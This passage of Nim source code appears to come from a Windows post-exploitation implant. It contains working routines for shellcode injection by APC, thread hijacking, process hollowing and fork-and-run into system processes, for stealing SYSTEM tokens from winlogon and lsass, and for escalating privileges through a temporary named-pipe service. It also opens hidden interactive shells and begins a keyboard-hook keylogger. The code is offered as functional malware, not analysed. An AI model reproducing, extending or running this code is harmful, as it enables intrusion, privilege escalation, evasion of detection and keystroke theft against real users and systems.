    var te: THREADENTRY32
    te.dwSize = DWORD(sizeof(te))
    var queued = 0
    if Thread32First(snap, addr te).bool:
      while true:
        if te.th32OwnerProcessID == DWORD(pid):
          let ht = callOpenThread(THREAD_SET_CONTEXT_FLAG, WINBOOL(0), te.th32ThreadID)
          if ht != 0:
            discard callQueueUserAPC(mem, ht, ULONG_PTR(0))
            discard callCloseHandle(ht)
            inc queued
        if not Thread32Next(snap, addr te).bool: break
    return "[+] APC queued to " & $queued & " thread(s) in PID " & $pid

  # ── Thread hijack injection ──────────────────────────────────────────────────
  proc doThreadHijack(pid: int; sc: seq[byte]): string =
    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
    defer: discard callCloseHandle(hProc)
    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
    var wr: SIZE_T
    discard callWriteProcessMemory(hProc, mem,
      cast[LPCVOID](unsafeAddr sc[0]), SIZE_T(sc.len), addr wr)
    var old: DWORD
    discard callVirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snap == INVALID_HANDLE_VALUE: return "Toolhelp snapshot failed"
    defer: discard CloseHandle(snap)
    var te: THREADENTRY32
    te.dwSize = DWORD(sizeof(te))
    var targetTID: DWORD = 0
    if Thread32First(snap, addr te).bool:
      while true:
        if te.th32OwnerProcessID == DWORD(pid): targetTID = te.th32ThreadID; break
        if not Thread32Next(snap, addr te).bool: break
    if targetTID == 0: return "no thread found in PID " & $pid
    let ht = callOpenThread(THREAD_ALL_ACCESS, WINBOOL(0), targetTID)
    if ht == 0: return "OpenThread failed (err " & $GetLastError() & ")"
    defer: discard callCloseHandle(ht)
    discard callSuspendThread(ht)
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_CONTROL
    if callGetThreadContext(ht, addr ctx) != 0:
      ctx.Rip = cast[DWORD64](mem)
      discard callSetThreadContext(ht, addr ctx)
    discard callResumeThread(ht)
    return "[+] thread " & $targetTID & " hijacked in PID " & $pid & " (" & $sc.len & " B)"

  # ── Process hollow ───────────────────────────────────────────────────────────
  proc doHollow(target: string; pebytes: seq[byte]): string =
    if pebytes.len < 0x40: return "[error: payload too small]"
    let peOff = int(uint32(pebytes[0x3C]) or (uint32(pebytes[0x3D]) shl 8) or
                    (uint32(pebytes[0x3E]) shl 16) or (uint32(pebytes[0x3F]) shl 24))
    template r16(o: int): uint16 = uint16(pebytes[o]) or (uint16(pebytes[o+1]) shl 8)
    template r32(o: int): uint32 = uint32(pebytes[o]) or (uint32(pebytes[o+1]) shl 8) or
      (uint32(pebytes[o+2]) shl 16) or (uint32(pebytes[o+3]) shl 24)
    template r64(o: int): uint64 = uint64(pebytes[o]) or (uint64(pebytes[o+1]) shl 8) or
      (uint64(pebytes[o+2]) shl 16) or (uint64(pebytes[o+3]) shl 24) or
      (uint64(pebytes[o+4]) shl 32) or (uint64(pebytes[o+5]) shl 40) or
      (uint64(pebytes[o+6]) shl 48) or (uint64(pebytes[o+7]) shl 56)
    if r32(peOff) != 0x00004550'u32: return "[error: not a PE]"
    let optOff  = peOff + 24
    if r16(optOff) != 0x020B'u16: return "[error: not PE32+]"
    let optSz   = int(r16(peOff + 20))
    let nSec    = int(r16(peOff + 6))
    let entryRVA = r32(optOff + 16)
    let prefBase = r64(optOff + 24)
    let imgSz   = r32(optOff + 56)
    let hdrSz   = r32(optOff + 60)
    var tgt = target
    if tgt.len == 0:
      let sys = getEnvCmd("SystemRoot", "C:\\Windows")
      tgt = sys & "\\System32\\svchost.exe"
      for c in [sys & "\\System32\\RuntimeBroker.exe",
                sys & "\\System32\\dllhost.exe"]:
        if fileExists(c): tgt = c; break
    var si: STARTUPINFOW
    si.cb = DWORD(sizeof(si))
    var pi: PROCESS_INFORMATION
    var tgtW = newWideCString(tgt)
    if callCreateProcessW(nil, tgtW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
                          nil, nil, addr si, addr pi) == 0:
      return "CreateProcessW(" & tgt & ") failed (err " & $GetLastError() & ")"
    var base = callVirtualAllocEx(pi.hProcess, cast[LPVOID](int(prefBase)),
                                   SIZE_T(imgSz), MEM_COMMIT or MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE)
    if base == nil:
      base = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(imgSz),
                                 MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if base == nil:
      discard TerminateProcess(pi.hProcess, 1)
      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
      return "VirtualAllocEx failed"
    var wr: SIZE_T
    let hSz = min(int(hdrSz), pebytes.len)
    discard callWriteProcessMemory(pi.hProcess, base,
      cast[LPCVOID](unsafeAddr pebytes[0]), SIZE_T(hSz), addr wr)
    let secBase = optOff + optSz
    for i in 0 ..< nSec:
      let o    = secBase + i * 40
      if o + 40 > pebytes.len: break
      let va   = int(r32(o + 12))
      let rawSz = int(r32(o + 16))
      let rawOff = int(r32(o + 20))
      if rawSz == 0 or rawOff == 0: continue
      if rawOff + rawSz > pebytes.len: continue
      let dst = cast[LPVOID](cast[int](base) + va)
      discard callWriteProcessMemory(pi.hProcess, dst,
        cast[LPCVOID](unsafeAddr pebytes[rawOff]), SIZE_T(rawSz), addr wr)
    let ep = DWORD64(cast[uint64](base) + uint64(entryRVA))
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_CONTROL
    if callGetThreadContext(pi.hThread, addr ctx) != 0:
      ctx.Rip = ep
      discard callSetThreadContext(pi.hThread, addr ctx)
    discard ResumeThread(pi.hThread)
    let res = "[+] hollow: " & tgt & " PID=" & $pi.dwProcessId &
              " entry=0x" & ep.toHex()
    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
    return res

  # ── Fork-and-run (shellcode in sacrificial process) ──────────────────────────
  proc doForkRun(cmd: string; sc: seq[byte]): string =
    var procPath = cmd
    if procPath.len == 0:
      let sys = getEnvCmd("SystemRoot", "C:\\Windows")
      procPath = sys & "\\System32\\svchost.exe"
      for c in [sys & "\\System32\\RuntimeBroker.exe",
                sys & "\\System32\\dllhost.exe",
                sys & "\\System32\\WerFault.exe"]:
        if fileExists(c): procPath = c; break
    var si: STARTUPINFOW
    si.cb = DWORD(sizeof(si))
    var pi: PROCESS_INFORMATION
    var cmdW = newWideCString(procPath)
    if callCreateProcessW(nil, cmdW, nil, nil, WINBOOL(0), CREATE_SUSPENDED,
                          nil, nil, addr si, addr pi) == 0:
      return "CreateProcessW(" & procPath & ") failed (err " & $GetLastError() & ")"
    let mem = callVirtualAllocEx(pi.hProcess, nil, SIZE_T(sc.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil:
      discard TerminateProcess(pi.hProcess, 1)
      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
      return "VirtualAllocEx failed"
    var wr: SIZE_T
    discard callWriteProcessMemory(pi.hProcess, mem,
      cast[LPCVOID](unsafeAddr sc[0]), SIZE_T(sc.len), addr wr)
    var old: DWORD
    discard callVirtualProtectEx(pi.hProcess, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_CONTROL
    if callGetThreadContext(pi.hThread, addr ctx) != 0:
      ctx.Rip = cast[DWORD64](mem)
      discard callSetThreadContext(pi.hThread, addr ctx)
    discard ResumeThread(pi.hThread)
    let res = "[+] fork-run: " & $sc.len & " B shellcode in " & procPath &
              " (PID=" & $pi.dwProcessId & ")"
    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
    return res

  # ── Privilege helper ─────────────────────────────────────────────────────────
  proc enablePriv(hToken: HANDLE; privName: string): bool =
    var luid: LUID
    if LookupPrivilegeValueW(nil, newWideCString(privName), addr luid) == 0: return false
    var tp: TOKEN_PRIVILEGES
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    if AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(tp)), nil, nil) == 0:
      return false
    # TRUE from AdjustTokenPrivileges can still mean ERROR_NOT_ALL_ASSIGNED.
    return GetLastError() != DWORD(1300) # ERROR_NOT_ALL_ASSIGNED

  proc spawnAsUserDirect(path, account, password: string;
                         pid: var DWORD): tuple[ok: bool, methodName: string, detail: string] =
    ## Credential-backed RunAs: create the child immediately.  The first path
    ## Start immediately with supplied credentials; token APIs are retained
    ## for hosts where Secondary Logon is unavailable.
    var domain = "."
    var username = account
    let slash = account.find('\\')
    if slash >= 0:
      domain = account[0..<slash]
      username = account[slash + 1..^1]
    else:
      let at = account.find('@')
      if at >= 0:
        username = account[0..<at]
        domain = account[at + 1..^1]
    if username.len == 0 or password.len == 0:
      return (false, "", "invalid username or password")

    let userW = newWideCString(username)
    let domainW = if domain.len == 0: cast[LPCWSTR](nil) else: newWideCString(domain)
    let passW = newWideCString(password)
    let pathW = newWideCString(path)
    let cwdW = newWideCString("C:\\Windows\\System32")
    var si: STARTUPINFOW
    zeroMem(addr si, sizeof(si))
    si.cb = DWORD(sizeof(si))
    si.dwFlags = DWORD(STARTF_USESHOWWINDOW)
    si.wShowWindow = WORD(SW_HIDE)
    var pi: PROCESS_INFORMATION
    zeroMem(addr pi, sizeof(pi))

    var cmdW = newWideCString("\"" & path & "\"")
    if CreateProcessWithLogonW(userW, domainW, passW, 0, pathW, cmdW,
        CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi) != 0:
      pid = pi.dwProcessId
      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
      return (true, "CreateProcessWithLogonW", "")
    let logonErr = GetLastError()

    var impersonated = false
    acquire(gTokenLock)
    let snapSysTok = gSystemToken
    release(gTokenLock)
    if snapSysTok != 0 and ImpersonateLoggedOnUser(snapSysTok) != 0:
      impersonated = true
      discard enablePriv(snapSysTok, "SeImpersonatePrivilege")
      discard enablePriv(snapSysTok, "SeIncreaseQuotaPrivilege")
      discard enablePriv(snapSysTok, "SeAssignPrimaryTokenPrivilege")
    var selfToken: HANDLE = 0
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
        addr selfToken) != 0:
      discard enablePriv(selfToken, "SeImpersonatePrivilege")
      discard enablePriv(selfToken, "SeIncreaseQuotaPrivilege")
      discard enablePriv(selfToken, "SeAssignPrimaryTokenPrivilege")
      discard CloseHandle(selfToken)

    var userToken: HANDLE = 0
    var batchErr: DWORD = 0
    var interactiveErr: DWORD = 0
    var logged = LogonUserW(userW, domainW, passW,
      LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, addr userToken)
    if logged == 0:
      batchErr = GetLastError()
      logged = LogonUserW(userW, domainW, passW,
        LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, addr userToken)
      if logged == 0: interactiveErr = GetLastError()

    var created = WINBOOL(0)
    var methodName = ""
    var asUserErr: DWORD = 0
    var withTokenErr: DWORD = 0
    if logged != 0:
      var cmdAsUser = newWideCString("\"" & path & "\"")
      created = CreateProcessAsUserW(userToken, pathW, cmdAsUser, nil, nil,
        WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
      if created != 0:
        methodName = "CreateProcessAsUserW"
      else:
        asUserErr = GetLastError()
      if created == 0:
        var cmdWithToken = newWideCString("\"" & path & "\"")
        created = CreateProcessWithTokenW(userToken, 0, pathW, cmdWithToken,
          CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
        if created != 0:
          methodName = "CreateProcessWithTokenW"
        else:
          withTokenErr = GetLastError()

    if created != 0:
      pid = pi.dwProcessId
      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
      discard CloseHandle(userToken)
      if impersonated: discard RevertToSelf()
      return (true, methodName, "")

    if userToken != 0: discard CloseHandle(userToken)
    if impersonated: discard RevertToSelf()
    return (false, "", "CreateProcessWithLogonW=" & $logonErr &
      " batch=" & $batchErr & " interactive=" & $interactiveErr &
      " AsUser=" & $asUserErr & " WithToken=" & $withTokenErr)

  proc runasStartTime(): string =
    let t = now()
    var total = t.hour * 60 + t.minute + 2
    total = total mod (24 * 60)
    let hh = if total div 60 < 10: "0" & $(total div 60) else: $(total div 60)
    let mm = if total mod 60 < 10: "0" & $(total mod 60) else: $(total mod 60)
    return hh & ":" & mm

  proc normalizeTokenSession(token: HANDLE) =
    ## Adjust token's session ID to match our process so cmd.exe can initialise
    ## user32.dll.  A cross-session token (winlogon = Session 1, agent = Session 0)
    ## causes STATUS_DLL_INIT_FAILED.  Requires SeTcbPrivilege on calling thread.
    const tokenSessionId: int32 = 12 # TOKEN_INFORMATION_CLASS::TokenSessionId
    var hSelf: HANDLE = 0
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hSelf) == 0: return
    var sessionId: DWORD = 0
    var retLen: DWORD = 0
    discard GetTokenInformation(hSelf, cast[TOKEN_INFORMATION_CLASS](tokenSessionId),
      addr sessionId, DWORD(sizeof(sessionId)), addr retLen)
    discard CloseHandle(hSelf)
    discard SetTokenInformation(token, tokenSessionId,
      addr sessionId, DWORD(sizeof(sessionId)))

  proc duplicatePrimaryShellToken(source: HANDLE): HANDLE =
    ## Prefer delegation for CreateProcess*; filtered tokens may only permit
    ## the ordinary impersonation level, so retain the compatibility fallback.
    var hPrim: HANDLE = 0
    discard DuplicateTokenEx(source, TOKEN_ALL_ACCESS, nil,
      securityDelegation, tokenPrimary, addr hPrim)
    if hPrim == 0:
      discard DuplicateTokenEx(source, TOKEN_ALL_ACCESS, nil,
        securityImpersonation, tokenPrimary, addr hPrim)
    return hPrim

  # ── Token steal ──────────────────────────────────────────────────────────────
  proc doTokenSteal(pid: int): string =
    var hSelf: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
    let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, DWORD(pid))
    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
    defer: discard CloseHandle(hProc)
    var hTok: HANDLE
    if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
      return "OpenProcessToken failed (err " & $GetLastError() & ")"
    defer: discard CloseHandle(hTok)
    # Impersonation token for ImpersonateLoggedOnUser (thread-level).
    var hDup: HANDLE
    discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
      securityImpersonation, tokenImpersonation, addr hDup)
    if hDup == 0: return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
    # Primary token for CreateProcessWithTokenW in runShell (process-level).
    let hPrim = duplicatePrimaryShellToken(hTok)
    if hPrim == 0:
      discard CloseHandle(hDup)
      return "DuplicateTokenEx (primary) failed (err " & $GetLastError() & ")"
    if ImpersonateLoggedOnUser(hDup) == 0:
      discard CloseHandle(hDup)
      discard CloseHandle(hPrim)
      return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
    discard CloseHandle(hDup)
    acquire(gTokenLock)
    let old = gStolenToken
    gStolenToken = hPrim
    release(gTokenLock)
    if old != 0: discard CloseHandle(old)
    return "[+] impersonating token from PID " & $pid

  proc doTokenMake(user, domain, pass: string): string =
    var hTok: HANDLE
    if LogonUserW(newWideCString(user), newWideCString(domain), newWideCString(pass),
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, addr hTok) == 0:
      return "LogonUser failed (err " & $GetLastError() & ")"
    # Primary token for CreateProcessWithTokenW in runShell (process-level).
    let hPrim = duplicatePrimaryShellToken(hTok)
    if hPrim == 0:
      discard CloseHandle(hTok)
      return "DuplicateTokenEx (primary) failed (err " & $GetLastError() & ")"
    if ImpersonateLoggedOnUser(hTok) == 0:
      discard CloseHandle(hTok)
      discard CloseHandle(hPrim)
      return "ImpersonateLoggedOnUser failed (err " & $GetLastError() & ")"
    discard CloseHandle(hTok)
    acquire(gTokenLock)
    let old = gStolenToken
    gStolenToken = hPrim
    release(gTokenLock)
    if old != 0: discard CloseHandle(old)
    return "[+] impersonating " & domain & "\\" & user

  proc doTokenDrop(): string =
    discard RevertToSelf()
    acquire(gTokenLock)
    let old = gStolenToken
    gStolenToken = 0
    release(gTokenLock)
    if old != 0: discard CloseHandle(old)
    return "[+] reverted to original token"

  proc doTokenWhoami(): string =
    var buf: array[512, WCHAR]; var sz = DWORD(buf.len)
    if GetUserNameW(addr buf[0], addr sz) == 0: return "GetUserNameW failed"
    return $cast[WideCString](addr buf[0])

  proc doGetSystem(): string =
    # ── T1: SeDebugPrivilege + winlogon token steal ──────────────────────
    var hSelf: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
    block t1:
      const targets = ["winlogon.exe", "lsass.exe", "services.exe", "wininit.exe"]
      var sysPid: DWORD = 0
      var matchName = ""
      for tgt in targets:
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snap == INVALID_HANDLE_VALUE: continue
        var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
        if Process32FirstW(snap, addr pe).bool:
          while true:
            if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == tgt:
              sysPid = pe.th32ProcessID; matchName = tgt; break
            if not Process32NextW(snap, addr pe).bool: break
        discard CloseHandle(snap)
        if sysPid != 0: break
      if sysPid == 0: break t1
      let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
      if hProc == 0: break t1
      defer: discard CloseHandle(hProc)
      var hTok: HANDLE
      if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0: break t1
      defer: discard CloseHandle(hTok)
      var hPrim, hDup: HANDLE
      hPrim = duplicatePrimaryShellToken(hTok)
      discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
        securityImpersonation, tokenImpersonation, addr hDup)
      if hPrim == 0 or hDup == 0:
        if hPrim != 0: discard CloseHandle(hPrim)
        if hDup != 0: discard CloseHandle(hDup)
        break t1
      if ImpersonateLoggedOnUser(hDup) == 0:
        discard CloseHandle(hDup); (if hPrim != 0: discard CloseHandle(hPrim)); break t1
      discard CloseHandle(hDup)
      normalizeTokenSession(hPrim)
      acquire(gTokenLock)
      let oldSys1 = gSystemToken
      gSystemToken = hPrim
      release(gTokenLock)
      if oldSys1 != 0: discard CloseHandle(oldSys1)
      return "[+] T1 SYSTEM (" & matchName & " PID=" & $sysPid & ")"

    # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
    let rnd: uint32 = GetTickCount().uint32 xor GetCurrentProcessId().uint32
    let pipeName = r"\\.\pipe\svc" & toHex(rnd.int64, 8)
    let svcName  = "svc" & toHex(int64(rnd xor 0xDEADBEEF'u32), 8)
    let binPath  = "cmd.exe /c echo . > " & pipeName

    let hPipe = CreateNamedPipeW(newWideCString(pipeName),
      DWORD(0x40000003), # PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
      DWORD(0), DWORD(1), DWORD(512), DWORD(512), DWORD(0), nil)
    if hPipe == INVALID_HANDLE_VALUE:
      return "[-] T1+T2 failed (CreateNamedPipe err " & $GetLastError() & ")"
    defer: discard CloseHandle(hPipe)

    let hScm = OpenSCManagerW(nil, nil, DWORD(0xF003F)) # SC_MANAGER_ALL_ACCESS
    if hScm == 0:
      return "[-] T1+T2 failed (OpenSCManager err " & $GetLastError() & ", need local admin)"
    defer: discard CloseServiceHandle(hScm)

    let hSvc = CreateServiceW(hScm, newWideCString(svcName), newWideCString(svcName),
      SERVICE_ALL_ACCESS, DWORD(0x10), DWORD(0x3), DWORD(0),
      newWideCString(binPath), nil, nil, nil, nil, nil)
    if hSvc == 0:
      return "[-] T1+T2 failed (CreateService err " & $GetLastError() & ")"
    defer:
      discard DeleteService(hSvc)
      discard CloseServiceHandle(hSvc)

    let hEvent = CreateEventW(nil, WINBOOL(1), WINBOOL(0), nil)
    if hEvent == 0:
      return "[-] T1+T2 failed (CreateEvent)"
    defer: discard CloseHandle(hEvent)

    var ov: OVERLAPPED
    zeroMem(addr ov, sizeof(ov))
    ov.hEvent = hEvent

    discard ConnectNamedPipe(hPipe, addr ov) # async — ERROR_IO_PENDING expected
    discard StartServiceW(hSvc, 0, nil)

    var wr = WaitForSingleObject(hEvent, DWORD(2000))
    if wr != WAIT_OBJECT_0:
      discard StartServiceW(hSvc, 0, nil)
      wr = WaitForSingleObject(hEvent, DWORD(3000))
    if wr != WAIT_OBJECT_0:
      discard CancelIoEx(hPipe, addr ov)
      return "[-] T1+T2 failed (T2 pipe timeout res=" & $wr & ")"

    if ImpersonateNamedPipeClient(hPipe) == 0:
      return "[-] T1+T2 failed (ImpersonateNamedPipeClient err " & $GetLastError() & ")"
    var storedT2 = false
    block storeT2:
      var hThr: HANDLE = 0
      if OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE or TOKEN_ALL_ACCESS,
          WINBOOL(0), addr hThr) != 0:
        var hPrim: HANDLE = duplicatePrimaryShellToken(hThr)
        discard CloseHandle(hThr)
        if hPrim != 0:
          normalizeTokenSession(hPrim)
          acquire(gTokenLock)
          let oldSys2 = gSystemToken
          gSystemToken = hPrim
          release(gTokenLock)
          if oldSys2 != 0: discard CloseHandle(oldSys2)
          storedT2 = true
    if not storedT2:
      return "[-] T1+T2 failed (DuplicateTokenEx primary token)"
    return "[+] T2 SYSTEM (named pipe + service)"

  # ── Token Store ──────────────────────────────────────────────────────────────
  proc doTokenStoreSteal(pid: DWORD): string =
    var hSelf: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
    let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid)
    if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
    defer: discard CloseHandle(hProc)
    var hTok: HANDLE
    if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
      return "OpenProcessToken failed (err " & $GetLastError() & ")"
    defer: discard CloseHandle(hTok)
    var hDup: HANDLE
    if DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil, securityImpersonation, tokenImpersonation, addr hDup) == 0:
      return "DuplicateTokenEx failed (err " & $GetLastError() & ")"
    var needed: DWORD = 0
    discard GetTokenInformation(hDup, cast[TOKEN_INFORMATION_CLASS](1), nil, 0, addr needed)
    var tbuf = newSeq[byte](int(needed))
    var userName = "unknown"
    if needed > 0 and GetTokenInformation(hDup, cast[TOKEN_INFORMATION_CLASS](1),
        cast[LPVOID](addr tbuf[0]), needed, addr needed) != 0:
      let tu = cast[ptr TOKEN_USER](addr tbuf[0])
      var nameBuf: array[256, WCHAR]; var domBuf: array[256, WCHAR]
      var nameLen = DWORD(256); var domLen = DWORD(256); var sidType: SID_NAME_USE
      if LookupAccountSidW(nil, tu.User.Sid, addr nameBuf[0], addr nameLen,
          addr domBuf[0], addr domLen, addr sidType) != 0:
        userName = $cast[WideCString](addr domBuf[0]) & "\\" & $cast[WideCString](addr nameBuf[0])
    let newId = gTokenStore.len + 1
    gTokenStore.add(TokenEntry(id: newId, pid: pid, user: userName, token: hDup))
    return "[+] stored token id=" & $newId & " pid=" & $pid & " user=" & userName

  # ── Interactive Shell ────────────────────────────────────────────────────────
  proc doIshellOpen(shell: string): string =
    if gIshellProc != 0: return "[-] interactive shell already open"
    var sa: SECURITY_ATTRIBUTES
    zeroMem(addr sa, sizeof(sa))
    sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
    var stdinR, stdinW, stdoutR, stdoutW: HANDLE
    if CreatePipe(addr stdinR, addr stdinW, addr sa, 0) == 0: return "CreatePipe(stdin) failed"
    if CreatePipe(addr stdoutR, addr stdoutW, addr sa, 0) == 0:
      discard CloseHandle(stdinR); discard CloseHandle(stdinW)
      return "CreatePipe(stdout) failed"
    discard SetHandleInformation(stdinW, HANDLE_FLAG_INHERIT, 0)
    discard SetHandleInformation(stdoutR, HANDLE_FLAG_INHERIT, 0)
    var si: STARTUPINFOW
    zeroMem(addr si, sizeof(si))
    si.cb = DWORD(sizeof(si)); si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
    si.wShowWindow = WORD(SW_HIDE)
    si.hStdInput = stdinR; si.hStdOutput = stdoutW; si.hStdError = stdoutW
    var pi: PROCESS_INFORMATION
    zeroMem(addr pi, sizeof(pi))
    let shellIsPs = shell == "ps" or shell == "powershell"
    let shellExe = if shellIsPs: "powershell.exe" else: "cmd.exe"
    var procOk: WINBOOL = 0
    var launchErr: DWORD = 0
    acquire(gTokenLock)
    let snapSysTokIsh = gSystemToken
    release(gTokenLock)
    if snapSysTokIsh != 0:
      var hSelf: HANDLE
      if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
          addr hSelf) != 0:
        discard enablePriv(hSelf, "SeImpersonatePrivilege")
        discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
        discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
        discard CloseHandle(hSelf)
      discard enablePriv(snapSysTokIsh, "SeImpersonatePrivilege")
      discard enablePriv(snapSysTokIsh, "SeIncreaseQuotaPrivilege")
      discard enablePriv(snapSysTokIsh, "SeAssignPrimaryTokenPrivilege")
      let appPath = if shellIsPs: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" else: "C:\\Windows\\System32\\cmd.exe"
      let childArgs = if shellIsPs: "-NoLogo -NoProfile -NonInteractive" else: "/Q"
      let appW = newWideCString(appPath)
      var argsW = newWideCString(childArgs)
      var argsAsUserW = newWideCString(childArgs)
      # Try CreateProcessAsUserW first: it does NOT go through seclogon, so
      # it can inherit the pipe handles across sessions without getting
      # STATUS_DLL_INIT_FAILED.  Fall back to CreateProcessWithTokenW if
      # SeAssignPrimaryTokenPrivilege is unavailable.
      procOk = CreateProcessAsUserW(snapSysTokIsh, appW, argsAsUserW, nil, nil,
        WINBOOL(1), CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
      launchErr = if procOk != 0: 0 else: GetLastError()
      if procOk == 0:
        procOk = CreateProcessWithTokenW(snapSysTokIsh, 0, appW, argsW,
          CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
        if procOk == 0: launchErr = GetLastError()
      if procOk == 0:
        let impOk = ImpersonateLoggedOnUser(snapSysTokIsh)
        if impOk != 0:
          var retryW = newWideCString(childArgs)
          procOk = CreateProcessWithTokenW(snapSysTokIsh, 0, appW, retryW,
            CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
          if procOk == 0: launchErr = GetLastError()
          discard RevertToSelf()
        else:
          launchErr = GetLastError()
    else:
      var cmdW = newWideCString(shellExe)
      procOk = CreateProcessW(nil, cmdW, nil, nil, WINBOOL(1), CREATE_NO_WINDOW,
        nil, nil, addr si, addr pi)
      if procOk == 0: launchErr = GetLastError()
    if procOk == 0:
      discard CloseHandle(stdinR); discard CloseHandle(stdinW)
      discard CloseHandle(stdoutR); discard CloseHandle(stdoutW)
      return "CreateProcess shell failed (err " & $launchErr & ")"
    discard CloseHandle(pi.hThread); discard CloseHandle(stdinR); discard CloseHandle(stdoutW)
    gIshellProc = pi.hProcess; gIshellStdinW = stdinW; gIshellStdoutR = stdoutR
    return "[+] shell opened (" & shellExe & ")"

  proc doIshellRun(cmd: string): string =
    if gIshellProc == 0: return "[-] no shell open"
    let line = cmd & "\r\n"
    var written: DWORD = 0
    discard WriteFile(gIshellStdinW, cast[LPCVOID](unsafeAddr line[0]),
      DWORD(line.len), addr written, nil)
    var output = ""; var waited = 0
    while waited < 2000:
      var avail: DWORD = 0
      if PeekNamedPipe(gIshellStdoutR, nil, 0, nil, addr avail, nil) != 0 and avail > 0:
        var rbuf = newString(int(avail)); var rdBytes: DWORD = 0
        if ReadFile(gIshellStdoutR, cast[LPVOID](addr rbuf[0]), avail, addr rdBytes, nil) != 0:
          output.add(rbuf[0..<int(rdBytes)])
      else:
        Sleep(DWORD(50)); waited += 50
    return if output == "": "[no output]" else: output

  proc doIshellClose(): string =
    if gIshellProc == 0: return "[-] no shell open"
    if gIshellStdinW != 0: discard CloseHandle(gIshellStdinW); gIshellStdinW = 0
    if WaitForSingleObject(gIshellProc, DWORD(2000)) == DWORD(WAIT_TIMEOUT):
      discard TerminateProcess(gIshellProc, 0)
    discard CloseHandle(gIshellProc); gIshellProc = 0
    if gIshellStdoutR != 0: discard CloseHandle(gIshellStdoutR); gIshellStdoutR = 0
    return "[+] shell closed"

  # ── Keylogger ────────────────────────────────────────────────────────────────
  proc keylogHookCb(nCode: int32; wParam: WPARAM; lParam: LPARAM): LRESULT {.stdcall.} =
    if nCode >= 0 and wParam == WPARAM(WM_KEYDOWN):
      let khs = cast[ptr KBDLLHOOKSTRUCT](lParam)
      var state: array[256, BYTE]
      discard GetKeyboardState(addr state[0])
